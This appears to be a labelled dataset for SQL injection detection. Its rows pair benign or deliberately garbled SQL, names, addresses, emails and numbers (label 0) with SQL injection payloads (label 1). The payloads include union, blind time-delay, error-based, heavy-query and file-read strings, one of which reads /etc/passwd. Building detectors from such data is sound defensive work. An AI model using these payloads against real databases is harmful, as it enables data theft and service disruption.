Payload	Attacker
SELECT advice FROM heart UNION ALL SELECT rhyme FROM room ORDER BY felt	0
39696	0
ip50	0
   SELECT Employees.sick, COUNT ( Orders.liftID )  AS coupleFROM    ( OrdersINNER JOIN kind ON Orders.factID  =  Employees.courseID ) 	0
encatusar	0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""uidb"" like ""uidb"	1
1'  )   as ubvf where 5923  =  5923 and 8490  =  4925--	1
calle juan de sevilla 102 3c	0
SELECT TOP 3 * FROM reach WHERE mood = 'crop'	0
"1%""   )    )     )   union all select null,null--"	1
inciertamente	0
anda matamalas	0
andia, 113 11g	0
-6039%'   )    )    or 6872  =  6872 and    (    (   '%'  =  '	1
 SELECT * FROM aside ORDER BY swam, ball	0
 SELECT * FROM lonely ORDER BY correctly, meal	0
"-9820"" or 1038  =  7502#"	1
7636020000000000	0
INSERT INTO nervous ( eye, figure, in, bark, bone, equipment )  VALUES  ( 'itself', 'taken'. similar', 'sent', 'talk', 'worse', 'dangerous' )  	0
 select * from users where id  =  1.  union select 1,version  (    )   -- 1	1
"waitfor delay '0:0:5' and    (    (     (  ""%""  =  """	1
FROM  ( SELECT DISTINCT old FROM cook ) 	0
SELECT option_value FROM wp_options WHERE option_name  =  '_options_instagram_url' LIMIT 1	0
rodis-ryan@colorprint.info	0
h9erc5	0
1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'zpyx'  =  'zpyx	1
armero filippi	0
swaden	0
SELECT nation ( s ) FROM spend INNER JOIN	0
SELECT COUNT ( wheel ) FROM lying	0
   SELECT lovely, section, not FROM thou WHERE amount  IS NULL	0
1%'   )    )    rlike sleep  (  5  )   and    (    (   '%'  =  '	1
   SELECT sweet, went, carefully FROM difficulty WHERE wonderful  IS NULL	0
SELECT * FROM population ORDER BY development DESC	0
9.15202E+015	0
SELECT * FROM choose WHERE anyway NOT LIKE 'path%'	0
-8513  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  5818  =  5818	1
SELECT breathing ( s )  FROM blood UNION	0
princep muntadas	0
   SELECT COUNT ( answer ) , stared FROM anywhere BY lady	0
"1%""  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""%""  =  """	1
  SELECT purple AS speech, victory AS [receive]  FROM town	0
-3084%'   )    )    order by 1--	1
   SELECT becoming, atomic, researchFROM carbon WHERE modern  IS NOT NULL	0
"1%""   )    )    and 1083  =  6202"	1
calle romeral, 143, 7?h	0
SELECT * FROM becoming WHERE hunter IN  ( SELECT thin FROM guess ) 	0
1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  	1
1%' and   (  3020  =  3020  )  *6703 and '%'  =  '	1
7758980000000000	0
SELECT option_value FROM wp_options WHERE option_name  =  'houzez_tax_settings' LIMIT 1	0
"1"" where 9230  =  9230"	1
SELECT COUNT ( perfect ) FROM captain	0
1  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  5130  =  5130	1
SELECT TOP 50 PERCENT * FROM measure SELECT * FROM except FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM push	0
SELECT * FROM solve WHERE habit = 'situation'	0
52422500000000	0
SELECT MIN ( standard )  AS movie FROM smaller	0
   SELECT COUNT ( conversation ) , under FROM anything BY seen	0
calle doctor jose manuel pascual y pascual 146, 4?c	0
1'||  (  select 'baur' from dual where 9384  =  9384 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --	1
boca de hurgano	0
manzano babot	0
sqlattempt1	1
SELECT catch ( s )  FROM instant FULL OUTER JOIN	0
  SELECT * FROM doctor WHERE adventure IN  ( 'stuck', 'pull', 'title' )  	0
1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'kyxl'  =  'kyxl	1
INSERT INTO ran ( instrument, wrong, oldest, few, wore, body )  VALUES  ( 'swept', 'dropped'. repeat', 'cookies', 'bark', 'carbon', 'tonight' )  	0
-4082   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   7874  =  7874	1
1'  )   where 5317  =  5317 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --	1
34347	0
4302980000000000	0
SELECT COUNT ( * )  FROM wp_options WHERE option_name LIKE 'wp\\_wps\\_bg\\_image\\_sync\\_1\\_batch\\_%'	0
carretera estacion, 144, 8-d	0
SELECT * FROM perfect WHERE cloth NOT BETWEEN 'gold' AND 'along'	0
-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#	1
1' and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'qdij'  =  'qdij	1
SELECT * FROM carried WHERE Price NOT BETWEEN 10 AND 20	0
70489976j	0
1%'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #	1
"1"" where 3221  =  3221 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --"	1
SELECT MIN ( given )  AS cost FROM thick	0
 select * from users where id  =  '1' or \.<$ union select 1,@@VERSION -- 1'	1
   SELECT late, dozen+ ', ' + rapidly+ ' ' + thumb+ ', ' + radio AS teeth  FROM develop	0
polit lauli	0
"1%""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""%""  =  """	1
SELECT COUNT ( DISTINCT not )  FROM fuel	0
SELECT TOP 50 PERCENT * FROM travel SELECT * FROM usual FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM stop	0
cariena	0
neira umbert	0
ardurn	0
1' in boolean mode  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   #	1
SELECT * FROM settlers WHERE lonely = 'brought' FETCH FIRST 3 ROWS ONLY	0
1',  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  7823  =  7823  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   	1
SELECT COUNT ( markID ) FROM him	0
 or ''&'	1
1\'1	1
tz_offset	1
-5580 or 4829  =  1968	1
SELECT AVG ( necessary ) FROM fat SELECT SUM ( appropriate ) 	0
1'   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   'guxv'  =  'guxv	1
1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#	1
 SELECT SupplierName, City, Country FROM Suppliers WHERE Country = 'Germany';	0
select   (  case when   (  5740  =  7636  )   then 5740 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--	1
SELECT * FROM science WHERE blood NOT BETWEEN 'raise' AND 'shaking'	0
1'   )    )    as grne where 9003  =  9003 order by 1--	1
3146	0
   SELECT COUNT ( voyage ) , idea FROM sad BY test	0
SELECT * FROM can WHERE NOT brief = 'desk'  AND NOT method = 'its'	0
 select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'	1
"-1600%""   )    )     )   or elt  (  4568  =  7693,7693  )   and    (    (     (  ""%""  =  """	1
select sleep  (  5  )   and    (    (   '%'  =  '	1
SELECT AVG ( coffee ) FROM club	0
SELECT * FROM smell  WHERE roar NOT LIKE '[review]%'	0
1'   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  'dbsm'  =  'dbsm	1
   SELECT ants, farther, opposite FROM lack WHERE college  IS NULL	0
-3899'  )   where 8152  =  8152 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --	1
SELECT drove	0
SELECT Count ( * )  AS what	0
tristan	0
SELECT * FROM studied FETCH FIRST 50 PERCENT ROWS ONLY	0
SELECT Count ( * )  AS eaten	0
1' where 3900  =  3900 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --	1
1'+  (  select 'gprq' where 8928  =  8928	1
 SELECT * FROM Customers  WHERE Country NOT IN  ( 'Germany', 'France', 'UK' ) ;	0
SELECT * FROM cast  WHERE test = mood	0
22193	0
prueckner@helicopter.com.gf	0
rapetto picabea	0
357	0
-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--	1
8231059999999999	0
burgs campa	0
select * from generate_series  (  4465,4465,case when   (  4465  =  6232  )   then 1 else 0 end  )   limit 1--	1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""%""  =  """	1
charlebois3@nanotecnologo.np	0
 SELECT column_name ( s )  FROM slight,according	0
iif  (  9875  =  8961,1,1/0  )  	1
SELECT TOP 3 * FROM foreign	0
   SELECT broad, blank+ ', ' + alike+ ' ' + managed+ ', ' + smallest AS dangerous  FROM meet	0
  SELECT * FROM tell WHERE your IN  ( 'faster', 'on', 'are' )  	0
SELECT negative ( s )  FROM various	0
"SELECT * FROM signal WHERE fifteen BETWEEN ""fuel"" AND    ""mother"""	0
-5362  )   union all select 7297,7297,7297,7297,7297#	1
nina	0
SELECT * FROM dig WHERE danger = 'son'  OR court = 'balance'	0
"1%"" rlike sleep  (  5  )  #"	1
villasandino	0
1'+  (  select 'mdxt' where 2733  =  2733 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --	1
48748000y	0
35093869d	0
SELECT * FROM pipe ORDER BY safe	0
-1212%'  )   or make_set  (  7588  =  2306,2306  )   and   (  '%'  =  '	1
kosanovic@discon.cg	0
-1036'  )   or 6872  =  6872 and   (  'wvbi'  =  'wvbi	1
SELECT * FROM eleven  WHERE tried = labor	0
sanou bellsol	0
"1""  )   where 6821  =  6821 waitfor delay '0:0:5'--"	1
"1"" union all select null,null,null,null,null,null,null,null--"	1
"1""   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""wdye"" like ""wdye"	1
SELECT TOP 3 * FROM wild WHERE laid = 'same' SELECT * FROM provide	0
busqu	0
SELECT MIN ( good )  AS rhythm FROM sentence	0
ive	0
SELECT * FROM row ORDER BY change DESC	0
DELETE FROM slightly	0
SELECT * FROM chart	0
"1""   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""uzjn""  =  ""uzjn"	1
falerno	0
SELECT themselves FROM riding UNION ALL SELECT might FROM rose ORDER BY dangerous	0
SELECT term_id, meta_key, meta_value FROM wp_termmeta WHERE term_id IN  ( 2712,3146,3152,2720,3078,2766,2679 )  ORDER BY meta_id ASC	0
SELECT COUNT ( DISTINCT equator )  FROM manufacturing	0
isidoro	0
UEf	1
  SELECT create,bottom FROM pretty WHERE familiar = 'play' UNION SELECT tower, opinion FROM go	0
1  )   where 1013  =  1013 and 5573  =  9445#	1
select sleep  (  5  )   and 'hhrw' like 'hhrw	1
SELECT * FROM court WHERE his = 'perhaps'	0
SELECT * FROM wrapped WHERE NOT ability = 'brick'  AND NOT thing = 'doll'	0
bonfiglio cabanas	0
-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#	1
36677303p	0
end--	1
  SELECT CONV ( 15,   10, 2 ) ;	0
carmia	0
SELECT TOP 3 * FROM certainly	0
SELECT * FROM function WHERE soft LIKE '%former%'	0
1'+  (  select inyd where 1668  =  1668 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  +'	1
select 'qqpjq'||  (  case 5118 when 5118 then 1 else 0 end  )  ||'qzvzq' from rdb$database	1
   SELECT Employees.white, COUNT ( Orders.beforeID )  AS lakeFROM    ( OrdersINNER JOIN herd ON Orders.whistleID  =  Employees.climbID ) 	0
1'+  (  select 'ymgm' where 8204  =  8204 and sleep  (  5  )  #	1
1' and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'lwir' like 'lwir	1
1'  )   where 5279  =  5279 or sleep  (  5  )  #	1
select   (  case when   (  4994  =  1572  )   then 4994 else 4994*  (  select 4994 from mysql.db  )   end  )  #	1
SELECT * FROM herself FETCH FIRST 3 ROWS ONLY	0
92106863m	0
1,  (  select 9100  =    (  'qqpjq'||  (  select case 9100 when 9100 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   	1
32	0
"1""   )    )    as ikuz where 7385  =  7385"	1
esplendoroso	0
SELECT * FROM bright FETCH FIRST 3 ROWS ONLY	0
SELECT TOP 50 PERCENT * FROM wait SELECT * FROM eight FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM present	0
muriel de la fuente	0
select * from users where id  =  1 +   (  \+  )   or 1  =  1 -- 1	1
"1""  )   where 6956  =  6956 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --"	1
  UPDATE gun SET hungry =  'chair', City =  'screen' WHERE slow =  melted	0
acrianzada	0
mcgovern-boxter@buscadordevideos.ag	0
   SELECT dress, title+ ', ' + dish+ ' ' + seed+ ', ' + dog AS pipe  FROM frighten	0
1  ) 	1
"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --"	1
c/ mineria, 151 13?g	0
SELECT * FROM imagine WHERE these = 'goes' FETCH FIRST 3 ROWS ONLY	0
1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'ccqs'  =  'ccqs	1
40146763x	0
   SELECT COUNT ( ran ) , monkey FROM operation BY cast	0
SELECT * FROM slave	0
c/ xeixa, 189 8?d	0
-8999'   )    )     )   or 6872  =  6872 and    (    (     (  'jare'  =  'jare	1
SELECT * FROM although FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM consonant	0
tejeda y segoyuela	0
SELECT ProductName FROM Products WHERE ProductID  =  ALL	0
 select * from users where id  =  1 <@<@ union select version  (    )  ,version  (    )   -- 1	1
SELECT mysterious	0
merkling	0
INSERT INTO motor ( gasoline, something, single, because, below, announced )  VALUES  ( 'gather', 'produce'. fight', 'chart', 'plate', 'meat', 'nose' )  	0
1'  )   where 1323  =  1323 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --	1
-3955%'   )    )    union all select 7999,7999,7999,7999,7999,7999,7999,7999,7999#	1
5044890000000000	0
  SELECT plainID AS ID, education AS beyond FROM suit	0
1'   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  'aqdj'  =  'aqdj	1
mieza	0
"1""  )   as htyo where 8322  =  8322 and 4595  =  4595#"	1
SELECT TOP 3 * FROM attack WHERE doctor = 'coat' SELECT * FROM smaller	0
gino	0
calle la corta, 85	0
"1""   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""djrh""  =  ""djrh"	1
67950400000000	0
calle joan salvat papasseit s/n,	0
SELECT * FROM husband WHERE them BETWEEN '1996-07-01' AND '1996-07-31'	0
SELECT conversation ( s )  FROM sit SELECT involved ( s ) 	0
"1""   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  ""zgoy"" like ""zgoy"	1
SELECT * FROM symbol WHERE perfect = 'fellow' LIMIT 3	0
SELECT AVG ( everything )  FROM prove  SELECT SUM ( glad ) 	0
elsen@whitehat.td	0
SELECT * FROM wp_posts WHERE ID  =  28694 LIMIT 1	0
1' and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --	1
SELECT * FROM frozen WHERE NOT crowd = 'forward'  AND NOT nor = 'soil'	0
"-7139""  )   where 2723  =  2723 or 3900  =  5082--"	1
SELECT * FROM like FETCH FIRST 50 PERCENT ROWS ONLY	0
"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""nwzu"" like ""nwzu"	1
 SELECT * FROM sets ORDER BY torn ASC, cat DESC	0
SELECT * FROM repeat WHERE observe BETWEEN 'exact' AND 'boat'	0
SELECT option_value FROM wp_options WHERE option_name  =  '_options_number_of_support_family' LIMIT 1	0
marbella	0
1   )    )    as lkqx where 6468  =  6468 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #	1
1'  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'nxkp' like 'nxkp	1
1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||'	1
SELECT AVG ( funny ) FROM around	0
granach@mccomptables.be	0
1%'  )   and elt  (  4249  =  4249,7259  )   and   (  '%'  =  '	1
charpini_daillie@inmobiliariahangar.ly	0
"-4287%""   )    )    union all select 9074,9074,9074,9074,9074,9074,9074,9074,9074,9074#"	1
SELECT * FROM keep WHERE wheel = 'sharp' LIMIT 3	0
9041	0
select * from users where id  =  1 or !<@ or 1  =  1 -- 1	1
-9676 or elt  (  1032  =  1032,3623  )  # jcaq	1
bogarde4@tiendasyofertas.museum	0
1'  )   where 6634  =  6634 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --	1
SELECT * FROM capital WHERE grabbed = 'fighting' LIMIT 3	0
23531966e	0
pagny@cpanelweb.yu	0
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""avyw""  =  ""avyw"	1
-8982'+  (  select anyd where 5358  =  5358 union all select 5358,5358,5358,5358,5358,5358#	1
1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and 'vwve' like 'vwve	1
 UPDATE adult SET honor = 'gain'WHERE chicken = 'paragraph'	0
6310	0
SELECT stems ( s FROM better RIGHT JOIN	0
op0o62i4	0
sineiro herranz	0
1'  )   where 8167  =  8167	1
SELECT strike	0
"1""   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  ""uisi""  =  ""uisi"	1
8230	0
SELECT * FROM population WHERE ground BETWEEN '1996-07-01' AND '1996-07-31'	0
SELECT * FROM recall WHERE motor = 'officer' FETCH FIRST 3 ROWS ONLY	0
ca5r7211a	0
SELECT * FROM six WHERE NOT community = 'famous'  AND NOT luck = 'engine'	0
-8292%'  )   or 8571  =  8571--	1
-9660   )    )    or 9762  =  9698	1
1'   )    )    as anaq where 9605  =  9605 and elt  (  4249  =  4249,7259  )  --	1
SELECT Count ( * )  AS instant	0
select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb	1
SELECT look ( s )  FROM service SELECT remember FROM surface	0
1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;	1
call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )  --	1
"1""   )    )    as zgig where 5748  =  5748 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --"	1
1',  (  select   (  case when   (  6894  =  6087  )   then 1 else 6894*  (  select 6894 from information_schema.character_sets  )   end   )    )   	1
SELECT * FROM supply ORDER BY pocket	0
rosalia	0
SELECT * FROM industrial  WHERE drew = rice	0
select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1	1
1  )   as clye where 7842  =  7842 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --	1
"  SELECT IF ( STRCMP ( ""hello"",""bye"" )   =  0, ""YES"", ""NO"" ) ;"	0
ru5runears2	0
SELECT * FROM  ( SELECT swing FROM paper ) 	0
5377370000000000	0
1   )    )     )   and   (  6148  =  3343  )  *3343 and    (    (     (  3271  =  3271	1
lug5r	0
lilah	0
SELECT engine FROM began UNION ALL SELECT jet FROM chamber ORDER BY log	0
SELECT expect ( s )  FROM say LEFT JOIN	0
1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'jrpk'  =  'jrpk	1
1'  )   and 7533  =  7533	1
1'||  (  select 'jlon' where 1461  =  1461	1
 SELECT column_name ( s )  FROM chain,breakfast	0
nagyszeder.kehoe@creacionesacampada.es	0
select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  +'	1
select case when 1892  =  3646 then 1 else null end--	1
SELECT * FROM level WHERE held = 'total'	0
1' where 7464  =  7464 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #	1
SELECT cover FROM building	0
menelao	0
SELECT * FROM member WHERE final NOT LIKE '[indicate]%'	0
  SELECT Orders.nearlyrID, Employees.suppose, Employees.balance FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.provideID ORDER BY Orders.tapeID	0
castell sargatal	0
9.17344E+015	0
7860000000000000	0
"1""  )   union all select null,null,null,null,null,null,null#"	1
SELECT clearly ( s )  FROM somebody UNION	0
SELECT * FROM steady WHERE dug BETWEEN entire09/01/1996several AND body15/31/1996union	0
"1%""   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   ""%""  =  """	1
-1844'  )   union all select 9572,9572,9572,9572#	1
1%'  )   waitfor delay '0:0:5'--	1
-5911 union all select 2245,2245,2245,2245,2245,2245#	1
1'   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'jueq'  =  'jueq	1
SELECT TOP 3 * FROM suppose SELECT * FROM stairs 3SELECT * FROM sharp	0
73488403e	0
1   )    )    as tuxy where 6855  =  6855 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --	1
SELECT angle ( s )  FROM identity FULL OUTER JOIN	0
SELECT * FROM your WHERE river = 'cast'  OR beyond = 'solid'	0
 SELECT * FROM hurt ORDER BY longer, me	0
SELECT national ( s ) FROM dug INNER JOIN	0
c1236ometimi8nto	0
c/ sant gonal 166 9-b	0
SELECT * FROM her FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM driving	0
1'  )   where 1115  =  1115	1
SELECT buy ( s )  FROM call UNION	0
  SELECT his AS available, medicine AS [hope]  FROM vegetable	0
   SELECT bare,directly,brave,younger,stay     (  (  seed JOIN teacher ON ordinary.death =  everyone.consist )   INNER JOIN cleanON Orders.old =  stepped.fenceID ) 	0
"-5928""   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   ""rggt"" like ""rggt"	1
"-3031"" union all select 2681#"	1
apotrerar	0
SELECT * FROM central WHERE experience = 'movement'	0
SELECT * FROM husband ORDER BY example DESC	0
finak	0
SELECT lost ( s )  FROM obtain FULL OUTER JOIN	0
07819871d	0
"1%""   )    )    union all select null,null,null,null#"	1
SELECT * FROM consider WHERE trouble = 'past'  OR pine = 'short'	0
"1"" and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""ouix""  =  ""ouix"	1
83178933p	0
SELECT * FROM may WHERE try = 'finest'	0
1 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) 	1
"-4072%""   )    )     )   or 3999  =  1979"	1
  SELECT frontID AS ID, command AS rapidly FROM everything	0
calle practicante calixto rodriguez 163,	0
1366	0
1'  )   rlike sleep  (  5  )   and   (  'qsub' like 'qsub	1
80igm94016	0
1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#	1
1'  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  'edcm' like 'edcm	1
1'+  (  select hett where 7228  =  7228	1
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and ""%""  =  """	1
1  )   where 2020  =  2020 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #	1
33s4h9929r	0
hews	0
 (  case when 6398  =  6398 then 1 else null end  ) 	1
-7945%'   )    )     )   union all select 4286,4286,4286,4286,4286,4286--	1
 SELECT CustomerName, City, Country FROM Customers ORDER BY  ( CASE     WHEN City IS NULL THEN Country     ELSE City END ) ;	0
